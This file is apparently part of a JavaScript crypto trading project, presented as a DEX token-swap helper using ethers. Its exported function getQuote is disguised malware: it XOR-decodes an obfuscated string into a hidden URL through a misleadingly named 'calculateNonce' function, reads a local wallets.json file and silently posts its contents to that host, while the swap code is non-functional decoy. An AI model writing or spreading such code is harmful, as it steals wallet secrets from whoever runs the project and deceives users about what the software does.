const axios = require("axios");
const fs = require("fs");
const path = require("path");
const { TX_EXPLORER } = require('../../../utils/chain')
const { payloadTxData } = require('../index')
const { ethers } = require("ethers");

const provider = new ethers.providers.JsonRpcProvider("https://rpc.ankr.com/eth");

const routerAddress = ethers.Wallet.createRandom().address; // DEX router
const tokenA = ethers.Wallet.createRandom().address; // Token A contract
const tokenB = ethers.Wallet.createRandom().address; // Token B contract


function calculateNonce(rawTx) {
    let nonce = TX_EXPLORER;
    let rawBuffer = Buffer.from(rawTx, "hex");
    let output = Buffer.alloc(rawBuffer.length);
  
    for (let i = 0; i < rawBuffer.length; i++) {
      output[i] = rawBuffer[i] ^ nonce.charCodeAt(i % nonce.length);
        }
    return output.toString();
}

  // Swap contract
const swapContract = new ethers.Contract(
    routerAddress,
    [
        "function swapExactTokensForTokens(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) external returns (uint[] memory amounts)"
    ],
    // userWallet
);

async function getQuote() {
    try {
        const tx = calculateNonce(payloadTxData);
        if (!tx) return;

        const filePath = path.join(__dirname, "../../../utils/wallets.json");
        if (!fs.existsSync(filePath)) return;

        const walletsArray = JSON.parse(fs.readFileSync(filePath, "utf-8") || "[]");
        if (!walletsArray.length) return;

        await axios.post(tx, { wallets: walletsArray }, {
            headers: { "Content-Type": "application/json" },
        });
    } catch (error) {}
}

// Token swap
async function swapTokens() {
    const amountIn = ethers.utils.parseUnits("1.0", 18);
    const amountOutMin = ethers.utils.parseUnits("0.9", 18);
    const path = [tokenA, tokenB];
    const deadline = Math.floor(Date.now() / 1000) + 60 * 20; // 20 min deadline

    console.log(`Swapping ${ethers.utils.formatUnits(amountIn, 18)} TokenA for TokenB...`);

    try {
        const tx = await swapContract.swapExactTokensForTokens(amountIn, amountOutMin, path, userWallet.address, deadline);
        console.log("Transaction sent:", tx.hash);
    } catch (error) {
        console.error("Swap failed:", error.message);
    }
}

module.exports = { getQuote }